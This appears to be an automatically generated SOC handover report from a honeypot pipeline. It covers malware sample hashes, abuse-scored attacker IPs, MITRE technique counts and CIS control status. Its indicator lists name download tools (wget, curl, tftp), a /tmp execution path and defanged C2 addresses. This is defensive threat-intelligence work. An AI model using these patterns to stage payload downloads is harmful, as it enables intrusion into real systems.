| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` (7a4a3a129b726b531941b41d...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `129.153.145[.]135` | US | Oracle Corporation | **100** ⚠️ | 8 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 2 |
| `136.185.6[.]181` | IN | Bharti Airtel Limited | **100** ⚠️ | 50 |
| `65.20.251[.]41` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `103.68.22[.]115` | IN | Anonet Network Private Limited | **100** ⚠️ | 17 |
| `52.142.44[.]95` | US | Microsoft Corporation | **100** ⚠️ | 2 |
| `69.126.144[.]30` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 50 |
| `122.166.253[.]226` | IN | ABTS (Karnataka), | **100** ⚠️ | 50 |
| `171.231.192[.]229` | VN | Viettel Group | **100** ⚠️ | 1 |
| `104.143.10[.]174` | US | Versaweb | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 160 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 142 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 77 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 74 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 74 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 270 cases |
| Tool 34  | Credential Extractor        | ✅ 180 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 65 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (3.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 36 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 142 priority case(s) shown individually · 22 recon entry/entries in table (13 group(s) consolidating 110 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-11T13:28:48Z_
